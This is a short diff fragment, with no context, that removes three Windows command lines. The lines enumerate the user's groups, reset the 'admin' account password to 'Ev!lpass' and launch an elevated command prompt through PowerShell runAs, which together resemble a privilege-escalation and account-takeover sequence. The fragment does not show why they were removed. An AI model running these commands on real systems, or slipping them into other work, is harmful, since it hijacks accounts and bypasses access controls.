@@ -1,3 +1,0 @@
-whoami /groups
-net user admin Ev!lpass
-powershell.exe Start-Process cmd.exe -Verb runAs
